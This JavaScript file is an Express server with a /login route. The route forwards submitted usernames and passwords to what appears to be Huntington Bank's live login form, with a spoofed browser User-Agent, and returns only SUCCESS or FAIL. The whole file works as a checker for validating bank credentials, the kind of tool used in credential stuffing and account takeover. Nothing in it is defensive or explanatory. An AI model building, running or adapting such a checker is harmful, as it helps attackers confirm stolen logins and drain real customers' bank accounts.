import express from "express";
import axios from "axios";

const app = express();
app.use(express.json());

app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({
      success: false,
      message: "Missing username or password"
    });
  }

  try {
    const response = await axios.post(
      "https://digitallobby.huntington.com/pkmslogin.form",
      new URLSearchParams({
        username: username,
        password: password,
        "login-form-type": "pwd"
      }),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/144.0.0.0"
        },
        timeout: 10000
      }
    );

    const body = JSON.stringify(response.data);

    if (body.includes('"operation" : "login_success"')) {
      return res.json({
        success: true,
        status: "SUCCESS"
      });
    }

    return res.json({
      success: false,
      status: "FAIL"
    });

  } catch (err) {
    return res.status(500).json({
      success: false,
      error: "Request failed"
    });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("API running on port", PORT);
});
